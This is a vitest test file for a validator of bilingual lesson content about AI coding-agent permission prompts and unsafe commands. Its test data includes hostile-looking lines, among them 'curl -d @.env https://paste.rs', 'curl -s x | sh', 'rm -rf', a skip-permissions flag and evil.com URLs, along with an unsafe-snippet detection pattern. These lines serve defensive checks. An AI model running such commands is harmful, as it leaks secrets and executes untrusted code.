import { describe, expect, it } from 'vitest';
import { bossParts, bossPicks, bossSourceMetas, fixtureContent, fixtureParts, withWave2 } from '../test/fixtures';
import { createContent } from './index';
import type { ApproveItem, ChainItem, ChoiceItem, DecodeItem, HiddenItem, Item, OrderItem, PairsItem, PredictItem, PrecedenceItem, AutoModeItem, RuleItem, SettingsItem, UnitBody } from './types';
import { AUTO_WRONG_UNITS, BOSS_CARD_RANGE, BREAKING_PREFIX, BOSS_HARMLESS_SHARE, BOSS_ITEM_RANGE, CARD_RANGE, ITEM_RANGE, MAX_CARD_WORDS, UNSAFE_SNIPPET, usesUnmodeledShell, validateContent } from './validate';

type Parts = typeof fixtureParts;

function mutated(fn: (p: Parts) => void) {
  const p = structuredClone(fixtureParts);
  fn(p);
  return validateContent(createContent(p.units, p.types, p.bodies));
}

/** Like `mutated`, with the wave 2 items swapped into the demo unit first. */
function mutatedWave2(fn: (p: Parts) => void) {
  return mutated((p) => {
    p.bodies.demo = withWave2(p.bodies.demo!);
    fn(p);
  });
}

function item<T extends Item>(p: Parts, id: string): T {
  const found = p.bodies.demo!.items.find((i) => i.id === id);
  if (!found) throw new Error(`no item ${id}`);
  return found as T;
}

function expectOne(problems: string[], id: string) {
  expect(problems).toHaveLength(1);
  expect(problems[0]).toContain(id);
}

describe('validateContent', () => {
  it('accepts the fixture', () => {
    expect(validateContent(fixtureContent)).toEqual([]);
  });

  it('1: flags an empty ja anywhere, with its path', () => {
    const problems = mutated((p) => {
      item<ApproveItem>(p, 'demo-approve').outcomes.no!.feedback.ja = '';
    });
    expect(problems).toEqual(['demo/demo-approve: ja text empty at outcomes.no.feedback']);
  });

  it('1: flags an empty ja in a card demo', () => {
    const problems = mutated((p) => {
      const demo = p.bodies.demo!.cards[0]!.demo;
      if (demo?.kind !== 'terminal') throw new Error('expected terminal demo');
      demo.commands[1]!.output[1]!.note!.ja = '  ';
    });
    expectOne(problems, 'demo-card-terminal');
  });

  it('2: flags a duplicate item id across units', () => {
    const problems = mutated((p) => {
      const meta = { ...structuredClone(p.units[0]!), key: 'demo2' };
      const body: UnitBody = structuredClone(p.bodies.demo!);
      body.items.forEach((i, n) => {
        if (n > 0) i.id = `x-${i.id}`;
      });
      p.units.push(meta);
      p.bodies.demo2 = body;
    });
    expectOne(problems, 'demo-approve');
  });

  it('3: flags predict.answer out of range', () => {
    expectOne(mutated((p) => void (item<PredictItem>(p, 'demo-predict').answer = 3)), 'demo-predict');
  });

  it('4: flags an empty approve.accept', () => {
    expectOne(mutated((p) => void (item<ApproveItem>(p, 'demo-approve').accept = [])), 'demo-approve');
  });

  it('5: flags a dangerous approve without headlines', () => {
    const problems = mutated((p) => {
      const a = item<ApproveItem>(p, 'demo-approve');
      a.accept = ['no'];
      a.outcomes.yes!.headline = { en: 'BREAKING', ja: '速報' };
    });
    expectOne(problems, 'demo-approve');
  });

  it('6: flags a harmless approve with a headline', () => {
    const problems = mutated((p) => {
      item<ApproveItem>(p, 'demo-approve').outcomes.always!.headline = { en: 'BREAKING', ja: '速報' };
    });
    expectOne(problems, 'demo-approve');
  });

  it('flags a headline that starts with BREAKING or 速報 (the badge already says it)', () => {
    expect(BREAKING_PREFIX.test('Developer keys leak')).toBe(false);
    for (const headline of [
      { en: 'BREAKING: Keys leak', ja: '鍵が流出' },
      { en: 'Keys leak', ja: '速報：鍵が流出' },
      { en: 'breaking : Keys leak', ja: '鍵が流出' },
    ]) {
      const problems = mutated((p) => {
        const a = item<ApproveItem>(p, 'demo-approve');
        a.accept = ['no'];
        for (const c of ['yes', 'always', 'auto'] as const) a.outcomes[c]!.headline = { en: 'Keys leak', ja: '鍵が流出' };
        a.outcomes.yes!.headline = headline;
      });
      expect(problems).toEqual(['demo/demo-approve: headline on yes starts with BREAKING (the badge already says it)']);
    }
  });

  describe('approve choices (F1, F8)', () => {
    const approve = (p: Parts) => item<ApproveItem>(p, 'demo-approve');
    const H = { en: 'BREAKING', ja: '速報' };
    const only = (problems: string[], msg: string) => {
      expect(problems).toHaveLength(1);
      expect(problems[0]).toContain('demo/demo-approve');
      expect(problems[0]).toContain(msg);
    };

    it('flags outcomes whose keys differ from choices', () => {
      only(mutated((p) => void delete approve(p).outcomes.auto), 'outcomes must match choices');
      only(
        mutated((p) => {
          const a = approve(p);
          a.choices = ['yes', 'auto', 'no'];
          a.accept = ['yes'];
          delete a.alwaysLabel;
        }),
        'outcomes must match choices',
      );
    });

    it('defaults choices to yes / always / no', () => {
      only(
        mutated((p) => {
          const a = approve(p);
          delete a.choices;
          delete a.outcomes.auto;
        }),
        'terminal Bash prompts offer auto (F1)',
      );
    });

    it('flags choices out of order or repeated', () => {
      only(mutated((p) => void (approve(p).choices = ['always', 'yes', 'auto', 'no'])), 'choices');
      only(mutated((p) => void (approve(p).choices = ['yes', 'yes', 'always', 'auto', 'no'])), 'choices');
    });

    it('flags always offered without an alwaysLabel', () => {
      only(mutated((p) => void delete approve(p).alwaysLabel), 'alwaysLabel');
    });

    it('allows a one-time-only prompt without always or alwaysLabel', () => {
      const problems = mutated((p) => {
        const a = approve(p);
        a.choices = ['yes', 'auto', 'no'];
        a.accept = ['yes'];
        delete a.alwaysLabel;
        delete a.outcomes.always;
      });
      expect(problems).toEqual([]);
    });

    it('flags a terminal Bash item without auto', () => {
      only(
        mutated((p) => {
          const a = approve(p);
          a.choices = ['yes', 'always', 'no'];
          delete a.outcomes.auto;
        }),
        'terminal Bash prompts offer auto (F1)',
      );
    });

    it('flags auto on a desktop item', () => {
      only(mutated((p) => void (approve(p).surface = 'desktop')), 'auto');
    });

    it('flags auto on a non-Bash terminal item', () => {
      only(mutated((p) => void (approve(p).tool = 'Edit')), 'auto');
    });

    it('flags auto on a prompt forced by an ask rule, and allows askRule without it', () => {
      only(mutated((p) => void (approve(p).askRule = true)), 'auto');
      const ok = mutated((p) => {
        const a = approve(p);
        a.askRule = true;
        a.choices = ['yes', 'always', 'no'];
        delete a.outcomes.auto;
      });
      expect(ok).toEqual([]);
    });

    it('accepts a desktop or non-Bash item with yes / always / no', () => {
      for (const patch of [{ surface: 'desktop' }, { tool: 'Edit' }] as const) {
        const problems = mutated((p) => {
          const a = approve(p);
          Object.assign(a, patch);
          a.choices = ['yes', 'always', 'no'];
          delete a.outcomes.auto;
        });
        expect(problems).toEqual([]);
      }
    });

    it("flags pane: 'browser' on a terminal item and allows it on desktop without alwaysLabel", () => {
      only(mutated((p) => void (approve(p).pane = 'browser')), 'pane');
      const ok = mutated((p) => {
        const a = approve(p);
        Object.assign(a, { surface: 'desktop', tool: 'Browser pane', pane: 'browser', choices: ['yes', 'always', 'no'] });
        delete a.alwaysLabel;
        delete a.outcomes.auto;
      });
      expect(ok).toEqual([]);
    });

    it('flags accept that names a choice not offered', () => {
      only(
        mutated((p) => {
          const a = approve(p);
          a.choices = ['yes', 'auto', 'no'];
          delete a.outcomes.always;
          delete a.alwaysLabel;
        }),
        'accept',
      );
    });

    it('flags a dangerous item missing a headline on auto', () => {
      const problems = mutated((p) => {
        const a = approve(p);
        a.accept = ['no'];
        a.outcomes.yes!.headline = H;
        a.outcomes.always!.headline = H;
      });
      only(problems, 'auto');
      expect(problems[0]).toContain('headline');
    });

    it('accepts a dangerous item with headlines on yes, always and auto', () => {
      const problems = mutated((p) => {
        const a = approve(p);
        a.accept = ['no'];
        a.outcomes.yes!.headline = H;
        a.outcomes.always!.headline = H;
        a.outcomes.auto!.headline = H;
      });
      expect(problems).toEqual([]);
    });

    it('flags a harmless item with a headline on auto', () => {
      only(mutated((p) => void (approve(p).outcomes.auto!.headline = H)), 'headline');
    });

    it('flags auto in accept in the learning units', () => {
      expect(AUTO_WRONG_UNITS).toEqual(['permissions', 'injection', 'browser', 'boss']);
      const problems = mutated((p) => {
        p.units[0]!.key = 'permissions';
        p.bodies.permissions = p.bodies.demo!;
        delete p.bodies.demo;
        (p.bodies.permissions.items.find((i) => i.id === 'demo-approve') as ApproveItem).accept.push('auto');
      });
      expect(problems).toEqual(['permissions/demo-approve: auto is never right while learning']);
      expect(mutated((p) => void approve(p).accept.push('auto'))).toEqual([]);
    });
  });

  it('7: flags combo.accept that is not the options with removes', () => {
    expectOne(mutated((p) => void (item<ChoiceItem>(p, 'demo-combo').accept = [0])), 'demo-combo');
  });

  it('8: flags an empty hidden.answer', () => {
    expectOne(mutated((p) => void (item<HiddenItem>(p, 'demo-hidden').answer = [])), 'demo-hidden');
  });

  it('8: flags a hidden.answer out of range', () => {
    expectOne(mutated((p) => void (item<HiddenItem>(p, 'demo-hidden').answer = [2, 3])), 'demo-hidden');
  });

  it('9: flags chain.answer out of range', () => {
    expectOne(mutated((p) => void (item<ChainItem>(p, 'demo-chain').answer = -1)), 'demo-chain');
  });

  it('10: flags order.start that is not a permutation', () => {
    expectOne(mutated((p) => void (item<OrderItem>(p, 'demo-order').start = ['ask', 'ask', 'tool'])), 'demo-order');
  });

  it('10: flags order.start that is already solved', () => {
    expectOne(mutated((p) => void (item<OrderItem>(p, 'demo-order').start = ['ask', 'tool', 'result'])), 'demo-order');
  });

  it('11: flags a pairs order that is not a permutation', () => {
    expectOne(mutated((p) => void (item<PairsItem>(p, 'demo-pairs').order = ['env', 'zshrc', 'ssh', 'nope'])), 'demo-pairs');
  });

  it('11: flags pairs with other than 4 items', () => {
    const problems = mutated((p) => {
      const it = item<PairsItem>(p, 'demo-pairs');
      it.items.pop();
      it.order = it.items.map((i) => i.id);
    });
    expectOne(problems, 'demo-pairs');
  });

  it('11: flags decode with fewer than 3 parts', () => {
    const problems = mutated((p) => {
      const it = item<DecodeItem>(p, 'demo-decode');
      it.parts.pop();
      it.order = ['rf', 'rm'];
    });
    expectOne(problems, 'demo-decode');
  });

  it('11: flags a decode order that is not a permutation', () => {
    expectOne(mutated((p) => void (item<DecodeItem>(p, 'demo-decode').order = ['rm', 'rf'])), 'demo-decode');
  });

  it('12: flags a real, unlisted host in any text', () => {
    const problems = mutated((p) => {
      item<PredictItem>(p, 'demo-predict').explain.en = 'See https://evil.com/x for more.';
    });
    expectOne(problems, 'demo-predict');
  });

  it('12: flags a navigate target without a scheme', () => {
    const problems = mutated((p) => {
      item<ChainItem>(p, 'demo-chain').steps[1]!.target = 'evil.com/inbox';
    });
    expectOne(problems, 'demo-chain');
  });

  it('12: checks a schemeless target of a non-navigate tool as a bare host, and spares file names', () => {
    expectOne(mutated((p) => void (item<ChainItem>(p, 'demo-chain').steps[0]!.target = 'evil.com/inbox')), 'host "evil.com"');
    expect(mutated((p) => void (item<ChainItem>(p, 'demo-chain').steps[0]!.target = 'notes/inbox.md'))).toEqual([]);
  });

  it('12: reports a host once per item', () => {
    const problems = mutated((p) => {
      const c = item<ChainItem>(p, 'demo-chain');
      c.steps[1]!.target = 'https://evil.com/a';
      c.steps[2]!.target = 'https://evil.com/?d=1';
    });
    expectOne(problems, 'demo-chain');
  });

  it('12: flags a browser scene url', () => {
    const problems = mutated((p) => {
      const c = item<ChainItem>(p, 'demo-chain');
      if (c.scene.kind !== 'browser') throw new Error('expected browser scene');
      c.scene.url = 'shop.com/cart';
    });
    expectOne(problems, 'demo-chain');
  });

  it('12: allows reserved hosts and the real-host allowlist', () => {
    const problems = mutated((p) => {
      item<DecodeItem>(p, 'demo-decode').command =
        'curl -d @.env https://paste.rs && curl http://localhost:3000 https://a.example.org https://x.test https://y.invalid';
    });
    expect(problems).toEqual([]);
  });

  it('13: flags a secret-looking string without FAKE', () => {
    expectOne(mutated((p) => void (item<DecodeItem>(p, 'demo-decode').command = 'export KEY=sk_live_abc123')), 'demo-decode');
  });

  it('13: allows a fake secret', () => {
    expect(mutated((p) => void (item<DecodeItem>(p, 'demo-decode').command = 'export KEY=ghp_FAKE_abc123'))).toEqual([]);
  });

  it('14: pins the revision 2 size rules', () => {
    expect([CARD_RANGE, ITEM_RANGE, MAX_CARD_WORDS]).toEqual([[4, 7], [10, 14], 100]);
  });

  it('14: flags a ready unit with 3 cards', () => {
    expect(mutated((p) => void p.bodies.demo!.cards.splice(3))).toEqual(['demo: ready unit needs 4–7 cards, has 3']);
  });

  it('14: flags a ready unit with 9 items', () => {
    expect(mutated((p) => void p.bodies.demo!.items.splice(9))).toEqual(['demo: ready unit needs 10–14 items, has 9']);
  });

  it('14: flags a card whose English body and key run over the word cap', () => {
    const words = (n: number) => Array.from({ length: n }, () => 'word').join(' ');
    const card = (p: Parts) => p.bodies.demo!.cards[0]!;
    const at = (n: number) =>
      mutated((p) => {
        const c = card(p);
        c.body = [{ en: words(n - 3), ja: '本文' }];
        c.key = { en: words(3), ja: '要点' };
      });
    expect(at(MAX_CARD_WORDS)).toEqual([]);
    expectOne(at(MAX_CARD_WORDS + 1), 'card over 100 words');
  });

  it('14: does not count try or deep text toward the word cap', () => {
    const words = Array.from({ length: 150 }, () => 'word').join(' ');
    expect(mutated((p) => void (p.bodies.demo!.cards[0]!.deep = { title: { en: 'More', ja: 'もっと' }, body: [{ en: words, ja: '深掘り' }] }))).toEqual([]);
  });

  it('14: flags a ready unit with too few cards', () => {
    expectOne(
      mutated((p) => void p.bodies.demo!.cards.splice(CARD_RANGE[0] - 1)),
      'demo',
    );
  });

  it('14: flags a ready unit with too many items', () => {
    const problems = mutated((p) => {
      const items = p.bodies.demo!.items;
      const extra = Array.from({ length: ITEM_RANGE[1] + 1 - items.length }, (_, n) => ({
        ...structuredClone(items[0]!),
        id: `more-${n}`,
      }));
      items.push(...extra);
    });
    expectOne(problems, 'demo');
  });

  describe('boss units', () => {
    /** The fixture plus a valid boss unit and the two units it picks from, mutated by `fn`. */
    const boss = (fn: (p: Parts) => void = () => {}) =>
      mutated((p) => {
        const parts = bossParts();
        p.units.push(...parts.units);
        Object.assign(p.bodies, parts.bodies);
        fn(p);
      });
    const picks = (p: Parts) => p.bodies.boss!.picks!;
    const meta = (p: Parts, key: string) => p.units.find((u) => u.key === key)!;

    it('pins the boss size rules', () => {
      expect([BOSS_CARD_RANGE, BOSS_ITEM_RANGE, BOSS_HARMLESS_SHARE]).toEqual([[1, 3], [18, 24], [0.6, 0.8]]);
    });

    it('accepts a boss unit with 1 card and 20 picks', () => {
      expect(boss()).toEqual([]);
    });

    it('uses 1–3 cards instead of 4–7', () => {
      expect(boss((p) => void p.bodies.boss!.cards.splice(0))).toEqual(['boss: boss unit needs 1–3 cards, has 0']);
    });

    it('needs 18–24 picks', () => {
      // Drop three harmless picks, so the harmless share stays in range.
      const drop = ['bsrc-a-safe-1', 'bsrc-a-safe-2', 'bsrc-a-safe-3'];
      expect(boss((p) => void (p.bodies.boss!.picks = picks(p).filter((id) => !drop.includes(id))))).toEqual(['boss: boss unit needs 18–24 picks, has 17']);
      expect(
        boss((p) => {
          const b = p.bodies['bsrc-b']!;
          b.items.push({ ...structuredClone(b.items[0]!), id: 'bsrc-b-more-1' }, { ...structuredClone(b.items[0]!), id: 'bsrc-b-more-2' });
          picks(p).push('bsrc-b-safe-3', 'bsrc-b-safe-4', 'bsrc-b-safe-5', 'bsrc-b-safe-6', 'bsrc-b-more-1');
        }),
      ).toEqual(['boss: boss unit needs 18–24 picks, has 25']);
    });

    it('resolves picks into copies, in pick order, with fromUnit', () => {
      const parts = bossParts();
      const c = createContent([...fixtureParts.units, ...parts.units], fixtureParts.types, { ...fixtureParts.bodies, ...parts.bodies });
      const items = c.bodyOf('boss')!.items as ApproveItem[];
      expect(items.map((it) => it.id)).toEqual(bossPicks);
      expect(items.every((it) => it.fromUnit === it.id.slice(0, 'bsrc-a'.length))).toBe(true);
      // Copies, not the published objects.
      const source = c.bodyOf('bsrc-a')!.items[0]!;
      expect(items.find((it) => it.id === source.id)).not.toBe(source);
      expect(source).not.toHaveProperty('fromUnit');
    });

    it('falls back to the source unit\'s first docs entry when a pick has no more link', () => {
      const parts = bossParts();
      delete parts.bodies['bsrc-a']!.items[0]!.more;
      const c = createContent(parts.units, fixtureParts.types, parts.bodies);
      const copy = c.bodyOf('boss')!.items.find((it) => it.id === 'bsrc-a-safe-1')!;
      expect(copy.more).toEqual(bossSourceMetas[0]!.docs![0]!.ref);
      const kept = c.bodyOf('boss')!.items.find((it) => it.id === 'bsrc-b-danger-1')!;
      expect(kept.more).toEqual({ slug: 'security' });
    });

    it('drops the decode hint from a copy (the timed run has no hints)', () => {
      const parts = bossParts();
      (parts.bodies['bsrc-a']!.items[0] as ApproveItem).decode = [{ code: 'npm', means: { en: 'Package tool', ja: 'パッケージ管理ツール' } }];
      const c = createContent(parts.units, fixtureParts.types, parts.bodies);
      expect(c.bodyOf('boss')!.items.find((it) => it.id === 'bsrc-a-safe-1')).not.toHaveProperty('decode');
      expect(c.bodyOf('bsrc-a')!.items[0]).toHaveProperty('decode');
    });

    it('flags items written into the boss file itself', () => {
      const problems = boss((p) => void p.bodies.boss!.items.push({ ...structuredClone(p.bodies['bsrc-a']!.items[0]!), id: 'boss-own-1' }));
      expect(problems).toEqual(['boss: boss file has its own items (boss-own-1); boss prompts come only from picks']);
    });

    it('flags a boss unit without picks', () => {
      expect(boss((p) => void delete p.bodies.boss!.picks)).toEqual(['boss: boss unit needs picks']);
    });

    it('flags a pick that does not exist', () => {
      expect(boss((p) => void (picks(p)[0] = 'nope-1'))).toContain('boss/picks/nope-1: no item with this id in a non-boss unit');
    });

    it('flags a pick that is not an approve item', () => {
      expect(boss((p) => void (picks(p)[0] = 'demo-predict'))).toContain('boss/picks/demo-predict: picks are approve items, this is predict');
    });

    it('flags a pick from a unit that is not ready', () => {
      const problems = boss((p) => void (meta(p, 'bsrc-a').status = 'soon'));
      expect(problems).toContain('boss/picks/bsrc-a-safe-1: picked from "bsrc-a", which is not ready');
    });

    it('flags a pick from another boss unit', () => {
      const problems = boss((p) => void (meta(p, 'bsrc-a').mode = 'boss'));
      expect(problems).toContain('boss/picks/bsrc-a-safe-1: no item with this id in a non-boss unit');
    });

    it('flags a pick whose accept includes auto', () => {
      const problems = boss((p) => {
        for (const it of p.bodies['bsrc-a']!.items) (it as ApproveItem).accept.push('auto');
      });
      expect(problems).toContain('boss/picks/bsrc-a-safe-1: auto is an accepted answer, never right in the boss');
    });

    it('flags a duplicate pick', () => {
      expect(boss((p) => void (picks(p)[1] = picks(p)[0]!))).toContain(`boss/picks/${bossPicks[0]}: duplicate pick`);
    });

    it('flags picks that are not mixed terminal and desktop', () => {
      const problems = boss((p) => p.bodies['bsrc-b']!.items.forEach((it) => void ((it as ApproveItem).surface = 'terminal')));
      expect(problems).toContain('boss: boss picks mix terminal and desktop prompts');
    });

    it('derives harmless from accept and wants about 70% harmless', () => {
      const allSafe = boss((p) => p.bodies['bsrc-b']!.items.forEach((it) => void ((it as ApproveItem).accept = ['yes'])));
      expect(allSafe).toContain('boss: boss picks are 20/20 harmless, need 60–80%');
    });

    it('flags picks in a unit that is not a boss', () => {
      expect(boss((p) => void (p.bodies.demo!.picks = ['bsrc-a-safe-1']))).toEqual(['demo: picks are only for a boss unit']);
    });

    it('keeps 4–7 cards for a ready unit without mode boss', () => {
      expect(boss((p) => void delete meta(p, 'boss').mode)).toEqual([
        'boss: ready unit needs 4–7 cards, has 1',
        'boss: ready unit needs 10–14 items, has 0',
        'boss: picks are only for a boss unit',
      ]);
    });
  });

  it('15: flags a ready unit with a bad lastChecked', () => {
    expectOne(mutated((p) => void (p.units[0]!.lastChecked = '21 Oct 2026')), 'demo');
  });

  it('15: flags a ready unit with 2 or 9 docs', () => {
    const doc = { ref: { slug: 'permissions' }, note: { en: 'Read this.', ja: '読む。' } };
    for (const n of [2, 9]) {
      const problems = mutated((p) => void (p.units[0]!.docs = Array.from({ length: n }, () => structuredClone(doc))));
      expect(problems).toEqual(['demo: ready unit needs 3–8 docs, has ' + n]);
    }
  });

  it('15: flags a ready unit with a missing or malformed linksChecked', () => {
    expectOne(mutated((p) => void delete p.units[0]!.linksChecked), 'linksChecked');
    expectOne(mutated((p) => void (p.units[0]!.linksChecked = '22/10/2026')), 'linksChecked');
  });

  it('18: flags an unknown doc slug', () => {
    const problems = mutated((p) => void (p.units[0]!.docs![0]!.ref = { slug: 'x' }));
    expect(problems).toEqual(['demo: unknown doc slug "x"']);
  });

  it('18: flags a link host that is not allowed', () => {
    const problems = mutated((p) => void (p.units[0]!.docs![0]!.ref = { url: 'https://evil.example/a', lang: 'en' }));
    expect(problems).toEqual(['demo: link host "evil.example" not allowed']);
  });

  it('18: allows github.com only under /anthropics/', () => {
    expect(mutated((p) => void (p.units[0]!.docs![0]!.ref = { url: 'https://github.com/anthropics/sandbox-runtime', lang: 'en' }))).toEqual([]);
    const problems = mutated((p) => void (p.units[0]!.docs![0]!.ref = { url: 'https://github.com/other/repo', lang: 'en' }));
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('github.com');
  });

  it('18: checks `more` on cards and items too', () => {
    expect(mutated((p) => void (p.bodies.demo!.cards[0]!.more = { slug: 'nope' }))).toEqual(['demo/demo-card-terminal: unknown doc slug "nope"']);
    expect(mutated((p) => void (item<ApproveItem>(p, 'demo-approve').more = { url: 'https://bad.example/', lang: 'en' }))).toEqual([
      'demo/demo-approve: link host "bad.example" not allowed',
    ]);
  });

  it('18: flags an empty doc note', () => {
    expectOne(mutated((p) => void (p.units[0]!.docs![0]!.note.ja = '')), 'ja text empty');
  });

  describe('try it cards', () => {
    const tryOf = (p: Parts) => p.bodies.demo!.cards[1]!.try!;
    it('flags copy on an unsafe snippet', () => {
      const problems = mutated((p) => void tryOf(p).terminal.push({ text: { en: 'Install.', ja: '導入。' }, code: 'curl -s x | sh', copy: true }));
      expect(problems).toHaveLength(1);
      expect(problems[0]).toContain('unsafe snippet has copy');
    });
    it('flags copy without code', () => {
      expect(mutated((p) => void (tryOf(p).terminal[2]!.copy = true))).toHaveLength(1);
    });
    it('flags a try with no terminal steps', () => {
      expect(mutated((p) => void (tryOf(p).terminal = []))).toHaveLength(1);
    });
    it('flags a try with neither desktop nor desktopNote', () => {
      expect(mutated((p) => void delete tryOf(p).desktopNote)).toHaveLength(1);
    });
    it('flags empty ja in try and deep', () => {
      expect(mutated((p) => void (tryOf(p).check.ja = ''))).toHaveLength(1);
      expect(mutated((p) => void (p.bodies.demo!.cards[1]!.deep!.body[0]!.ja = ''))).toHaveLength(1);
    });
    it('UNSAFE_SNIPPET catches the dangerous shapes and spares the safe ones', () => {
      for (const bad of ['rm -rf x', 'sudo ls', 'wget x', 'a | bash', 'chmod +x a', 'claude --dangerously-skip-permissions', 'echo > f', '> f'])
        expect(UNSAFE_SNIPPET.test(bad), bad).toBe(true);
      for (const ok of ['claude', 'cd ~/project', 'claude --version', '/help']) expect(UNSAFE_SNIPPET.test(ok), ok).toBe(false);
    });
  });

  it('16: flags a ready unit with no body', () => {
    expectOne(mutated((p) => void delete p.bodies.demo), 'demo');
  });

  it('16: flags a body for a soon unit', () => {
    expectOne(mutated((p) => void (p.units[0]!.status = 'soon')), 'demo');
  });

  it('17: flags a chip key that is not a practice type', () => {
    expectOne(mutated((p) => void p.units[0]!.chips.push('nope')), 'nope');
  });

  it('18: flags a wrong predict option without feedback', () => {
    expectOne(mutated((p) => void delete item<PredictItem>(p, 'demo-predict').opts[2]!.feedback), 'demo-predict');
  });

  describe('rule items', () => {
    const rule = (p: Parts) => item<RuleItem>(p, 'demo-rule');
    it('flags a rule item with no solution', () => {
      const problems = mutated((p) => void (rule(p).patterns = ['Bash(curl)', 'Bash(*)']));
      expect(problems).toEqual(['demo/demo-rule: rule item has no solution']);
    });
    it('flags a rule item with no wrong answer', () => {
      const problems = mutated((p) => {
        rule(p).lists = ['deny'];
        rule(p).patterns = ['Bash(curl *)'];
      });
      expect(problems).toEqual(['demo/demo-rule: rule item has no wrong answer']);
    });
    it('flags empty tests, lists or patterns', () => {
      expectOne(mutated((p) => void (rule(p).tests = [])), 'rule.tests is empty');
      expectOne(mutated((p) => void (rule(p).lists = [])), 'rule.lists is empty');
      expectOne(mutated((p) => void (rule(p).patterns = [])), 'rule.patterns is empty');
    });
    it('usesUnmodeledShell catches the forms the matcher does not model', () => {
      for (const cmd of [
        'echo $(curl x)',
        'echo `curl x`',
        '(rm -rf y)',
        'diff <(ls a) <(ls b)',
        'echo hi > out.txt',
        'sort < in.txt',
        '{ rm -rf y; }',
        'timeout 5 rm -rf x',
        'ls && nohup make',
        'xargs rm',
        'FOO=1 npm test',
        'git status',
        'cd x && git push',
      ]) {
        expect(usesUnmodeledShell(cmd), cmd).toBe(true);
      }
      for (const cmd of ['curl https://example.com', '/usr/bin/curl https://example.com', "sh -c 'curl https://example.com'", 'npm run build && npm test', 'ls -la | wc -l', 'timeouts']) {
        expect(usesUnmodeledShell(cmd), cmd).toBe(false);
      }
    });
    it('flags a rule test call that uses an unmodeled shell form', () => {
      const problems = mutated((p) => void rule(p).tests.push({ call: { tool: 'Bash', target: 'echo $(curl x)' }, want: 'asks' }));
      expect(problems).toEqual(["demo/demo-rule: call uses a shell form this model doesn't cover: echo $(curl x)"]);
    });
    it('ignores shell forms in non-Bash calls', () => {
      expect(mutated((p) => void rule(p).tests.push({ call: { tool: 'Read', target: './(x)' }, want: 'runs' }))).toEqual([]);
    });
    it('flags a rules demo call that uses an unmodeled shell form', () => {
      const problems = mutated((p) => {
        const demo = p.bodies.demo!.cards.find((c) => c.demo?.kind === 'rules')!.demo;
        if (demo?.kind !== 'rules') throw new Error('expected rules demo');
        demo.calls.push({ tool: 'Bash', target: 'git status' });
      });
      expect(problems).toEqual(["demo/demo-card-rules: call uses a shell form this model doesn't cover: git status"]);
    });
    it('flags a pattern or existing rule that does not parse', () => {
      expect(mutated((p) => void rule(p).patterns.push('Bash('))).toEqual(['demo/demo-rule: rule pattern "Bash(" does not parse']);
      expect(mutated((p) => void rule(p).existing!.push({ list: 'deny', text: 'nope(' }))).toEqual([
        'demo/demo-rule: existing rule "nope(" does not parse',
      ]);
    });
  });

  describe('settings items', () => {
    const settings = (p: Parts) => item<SettingsItem>(p, 'demo-settings');
    it('flags an empty or out-of-range answer', () => {
      expectOne(mutated((p) => void (settings(p).answer = [])), 'settings.answer is empty');
      expectOne(mutated((p) => void (settings(p).answer = [2, 9])), 'settings.answer out of range');
    });
    it('applies to review and trim too', () => {
      expectOne(mutated((p) => void Object.assign(settings(p), { type: 'trim', answer: [9] })), 'answer out of range');
    });
    it('flags a note keyed by a line that does not exist', () => {
      expectOne(mutated((p) => void (settings(p).notes!['9'] = { en: 'x', ja: 'x' })), 'settings.notes key "9"');
    });
    it('flags a settings file line that holds a live-looking secret', () => {
      expectOne(mutated((p) => void settings(p).lines.push('"token": "sk_live_abc"')), 'secret-looking');
    });
  });

  describe('precedence items', () => {
    const prec = (p: Parts) => item<PrecedenceItem>(p, 'demo-precedence');
    it('flags an answer out of range', () => {
      expectOne(mutated((p) => void (prec(p).answer = 5)), 'precedence.answer 5 out of range');
    });
    it('flags a wrong option without feedback', () => {
      expectOne(mutated((p) => void delete prec(p).opts[0]!.feedback), 'precedence option 0 needs feedback');
    });
    it('flags duplicate scopes in files', () => {
      expectOne(mutated((p) => void (prec(p).files[1]!.scope = 'user')), 'duplicate scope "user"');
    });
    it('flags fewer than two files', () => {
      expectOne(mutated((p) => void prec(p).files.pop()), 'precedence needs at least 2 files');
    });
  });

  describe('settings demo', () => {
    const demo = (p: Parts) => {
      const d = p.bodies.demo!.cards.find((c) => c.demo?.kind === 'settings')!.demo;
      if (d?.kind !== 'settings') throw new Error('expected settings demo');
      return d;
    };
    it.each(['allow', 'ask', 'deny'])('rejects the list key "%s" (lists merge, F11)', (key) => {
      expectOne(mutated((p) => void (demo(p).key = key)), `settings demo key "${key}"`);
    });
    it('flags duplicate scopes and a key no file sets', () => {
      expectOne(mutated((p) => void (demo(p).files[1]!.scope = 'user')), 'duplicate scope "user"');
      expectOne(mutated((p) => void (demo(p).key = 'model')), 'no file sets "model"');
    });
  });

  describe('automode items', () => {
    const auto = (p: Parts) => item<AutoModeItem>(p, 'demo-automode');
    it.each(['runs', 'blocked', 'asks'] as const)('flags missing feedback for %s', (o) => {
      expectOne(mutated((p) => void delete (auto(p).feedback as Partial<AutoModeItem['feedback']>)[o]), `automode feedback.${o} is missing`);
    });
    it('flags an answer that is not an outcome', () => {
      expectOne(mutated((p) => void ((auto(p) as { answer: string }).answer = 'maybe')), 'automode.answer "maybe"');
    });
  });

  describe('modes demo', () => {
    const demo = (p: Parts) => {
      const d = p.bodies.demo!.cards.find((c) => c.demo?.kind === 'modes')!.demo;
      if (d?.kind !== 'modes') throw new Error('expected modes demo');
      return d;
    };
    it('accepts the Shift+Tab cycle from auto', () => {
      expect(mutated(() => undefined)).toEqual([]);
    });
    it('rejects any other order or set of modes', () => {
      expectOne(mutated((p) => void demo(p).modes.reverse()), 'modes demo must follow the Shift+Tab cycle (F4)');
      expectOne(mutated((p) => void demo(p).modes.pop()), 'modes demo must follow the Shift+Tab cycle (F4)');
    });
    it('rejects a status string that is not the product string (F4)', () => {
      expectOne(mutated((p) => void (demo(p).modes[1]!.status = '⏸ default mode on')), 'modes demo status for default must be "⏸ manual mode on"');
    });
    it('rejects a desktop label that is not the product label (F4)', () => {
      expectOne(mutated((p) => void (demo(p).modes[0]!.desktop = 'Auto mode')), 'modes demo desktop label for auto must be "Auto"');
    });
  });

  describe('wave 2 item shapes', () => {
    it('accepts the wave 2 fixture items', () => {
      expect(mutatedWave2(() => {})).toEqual([]);
    });
    it('flags a poisoned item whose source is not a tool list', () => {
      const problems = mutatedWave2((p) => {
        const it = item<HiddenItem>(p, 'demo-poisoned');
        it.source = 'web';
        it.lines.forEach((l) => delete l.tool);
      });
      expectOne(problems, 'poisoned needs source "tools"');
    });
    it('flags a tool name on a line whose source is not a tool list', () => {
